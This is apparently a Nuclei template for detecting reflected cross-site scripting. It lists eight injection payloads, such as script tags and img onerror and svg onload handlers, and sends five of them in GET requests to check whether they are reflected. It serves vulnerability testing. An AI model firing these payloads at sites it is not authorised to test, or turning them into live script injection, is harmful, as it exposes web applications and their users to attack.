id: xss-reflected-comprehensive

info:
  name: Comprehensive Reflected XSS Detection
  author: watchdogs
  severity: medium
  description: Tests multiple XSS payloads for reflection
  reference:
    - https://github.com/salarrbl/cexss
    - https://portswigger.net/web-security/cross-site-scripting
  tags: xss, reflected, comprehensive, rebel-methodology

variables:
  payloads:
    - "<b/cexss"
    - "cexss\"\""
    - "cexss''"
    - "<script>alert(1)</script>"
    - "\"><script>alert(1)</script>"
    - "javascript:alert(1)"
    - "<img src=x onerror=alert(1)>"
    - "<svg onload=alert(1)>"

http:
  - raw:
      - |
        GET {{BaseURL}}?{{param}}={{payloads[0]}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"<b/cexss'
      - type: status
        status:
          - 200
          - 400
          - 403
          - 500

  - raw:
      - |
        GET {{BaseURL}}?{{param}}={{payloads[1]}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'cexss""'
      - type: status
        status:
          - 200
          - 400
          - 403
          - 500

  - raw:
      - |
        GET {{BaseURL}}?{{param}}={{payloads[2]}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "cexss''"
      - type: status
        status:
          - 200
          - 400
          - 403
          - 500

  - raw:
      - |
        GET {{BaseURL}}?{{param}}={{payloads[3]}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<script>alert(1)</script>"
      - type: status
        status:
          - 200
          - 400
          - 403
          - 500

  - raw:
      - |
        GET {{BaseURL}}?{{param}}={{payloads[4]}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "\"><script>alert(1)</script>"
      - type: status
        status:
          - 200
          - 400
          - 403
          - 500